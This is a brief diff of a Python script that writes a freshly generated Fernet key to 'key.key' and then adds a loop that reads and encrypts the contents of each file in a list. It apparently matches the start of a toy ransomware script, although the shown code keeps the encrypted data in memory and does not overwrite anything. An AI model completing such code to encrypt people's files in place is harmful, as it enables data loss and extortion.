@@ -16,3 +16,10 @@ key = Fernet.generate_key()
 with open("key.key", "wb") as thekey:
     thekey.write(key)                   # After open, will write the saved key value into the file.
 
+for file in files:
+    with open(file,"rb") as f:
+        contents = f.read()
+    contents_encrypted = Fernet(key).encrypt(contents)  # encrypting the contents generated for each file
+
+
+
